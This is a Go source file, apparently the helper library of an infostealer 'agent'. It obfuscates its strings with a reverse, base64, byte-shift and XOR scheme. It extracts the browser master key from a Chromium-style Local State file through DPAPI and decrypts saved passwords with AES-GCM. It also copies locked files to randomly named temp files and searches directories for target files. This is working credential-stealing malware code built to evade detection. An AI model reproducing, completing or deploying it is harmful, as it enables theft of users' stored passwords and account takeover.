package lib

import (
	"agent/vars"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha512"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"math/rand"
	"os"
	"path"
	"reflect"
	"strings"
	"syscall"
	"unsafe"
)

func Reverse(s []byte) string {
	var b strings.Builder
	b.Grow(len(s))
	for i := len(s) - 1; i >= 0; i-- {
		b.WriteByte(s[i])
	}
	return b.String()
}

func GetMD5(b []byte) string {
	hasher := sha512.New()
	hasher.Write(b)
	return fmt.Sprintf("%x", hasher.Sum(nil))
}

func GetHash(str string) string {
	hasher := sha512.New()
	hasher.Write([]byte(str))
	return base64.StdEncoding.EncodeToString(hasher.Sum(nil))
}

func XOR(input, key []byte) ([]byte, error) {
	var output []byte
	if len(input) > len(key) {
		return output, errors.New("key and data length does not match")
	}

	for i := 0; i < len(input); i++ {
		output = append(output, input[i]^key[i])
	}

	return output, nil
}

func Decode(s string) string {
	dkey, err := base64.StdEncoding.DecodeString(vars.Key)
	if err != nil {
		return ""
	}

	rev := Reverse([]byte(s))
	dec, err := base64.StdEncoding.DecodeString(rev)
	if err != nil {
		return ""
	}

	var n []byte = []byte{}
	for i := range dec {
		n = append(n, (dec[i] - 3))
	}

	xored, err := XOR([]byte(n), dkey)
	if err != nil {
		return ""
	}

	return string(xored)
}

func DecryptPass(buff, master string) (string, error) {
	iv := buff[3:15]
	data := buff[15:]

	block, err := aes.NewCipher([]byte(master))
	if err != nil {
		return "", err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	dec, err := gcm.Open(nil, []byte(iv), []byte(data), nil)
	if err != nil {
		return "", err
	}

	return string(dec), nil
}

func GetMaster(p string) (string, error) {
	var master string

	data, err := os.ReadFile(p)
	if err != nil {
		return master, err
	}

	var result map[string]interface{}
	err = json.Unmarshal(data, &result)
	if err != nil {
		return master, err
	}

	enckey := result[Decode(vars.Key_oscrypt)].(map[string]interface{})[Decode(vars.Key_enckey)].(string)
	deckey, err := base64.StdEncoding.DecodeString(enckey)
	if err != nil {
		return master, err
	}

	strkey := string(deckey)
	strkey = strings.Trim(strkey, Decode(vars.Key_dpapi))
	master, err = DPAPI_Decrypt(strkey)
	if err != nil {
		return master, err
	}

	return master, nil
}

var chars = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890")

func MakeRand(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

func CleanTemp(tmp string) {
	os.Remove(tmp)
}

func CopyFile(src string, dst string) error {
	f, err := os.Open(src)
	if err != nil {
		return err
	}
	defer f.Close()

	n, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer n.Close()

	_, err = io.Copy(n, f)
	if err != nil {
		return err
	}

	return nil
}

func CopyTemp(org string) string {
	tempcpy := path.Join(os.Getenv("TEMP"), MakeRand(12))
	if nil != CopyFile(org, tempcpy) {
		return ""
	}
	return tempcpy
}

func FindFiles(dir string, name string, ext bool) []string {
	var res []string
	st, err := os.Stat(dir)
	if err != nil || !st.IsDir() {
		return res
	}

	entries, err := os.ReadDir(dir)
	if err != nil {
		return res
	}

	for _, e := range entries {
		fp := path.Join(dir, e.Name())
		st, err := os.Stat(fp)
		if err != nil {
			continue
		}

		if st.IsDir() {
			res = append(res, FindFiles(fp, name, ext)...)
			continue
		}

		if !ext && e.Name() == name {
			res = append(res, fp)
		}

		if ext && strings.HasSuffix(e.Name(), name) {
			res = append(res, fp)
		}
	}

	return res
}

func BytesToHuman(b int64) string {
	const unit = 1024
	if b < unit {
		return fmt.Sprintf("%d B", b)
	}
	div, exp := int64(unit), 0
	for n := b / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %ciB",
		float64(b)/float64(div), "KMGTPE"[exp])
}

func MessageBox(hwnd uintptr, caption, title string, flags uint) int {
	ret, _, _ := syscall.NewLazyDLL(Decode(vars.Path_userdll)).NewProc(Decode(vars.Key_msgbox)).Call(
		uintptr(hwnd),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(caption))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))),
		uintptr(flags))

	return int(ret)
}

func GetAgent() string {
	dec := Decode(vars.Req_agent)
	return strings.ReplaceAll(dec, "_", " ")
}

func DecodeJSON(s interface{}) (interface{}, error) {
	if s == nil {
		return nil, nil
	}

	raw, err := json.Marshal(s)
	if err != nil {
		return nil, err
	}

	var ifc interface{}
	err = json.Unmarshal(raw, &ifc)
	if err != nil {
		return nil, err
	}

	if reflect.TypeOf(ifc).Kind() == reflect.Slice {
		mp := ifc.([]interface{})
		for i := range mp {
			mp[i], err = DecodeJSON(mp[i])
			if err != nil {
				return nil, err
			}
		}
		return mp, nil
	}

	mp := ifc.(map[string]interface{})
	keys := make([]string, 0, len(mp))
	for k := range mp {
		keys = append(keys, k)
	}

	for _, k := range keys {
		if strings.HasPrefix(k, "ST_") {
			mp[Decode(k[3:])], err = DecodeJSON(mp[k])
			if err != nil {
				return nil, err
			}

			delete(mp, k)
			continue
		}
		mp[Decode(k)] = mp[k]
		delete(mp, k)
	}

	return mp, nil
}

func MarshalJSON(s interface{}) ([]byte, error) {
	mp, err := DecodeJSON(s)
	if err != nil {
		return nil, err
	}
	return json.Marshal(mp)
}

func NewErr(enc string) error {
	return errors.New(Decode(enc))
}
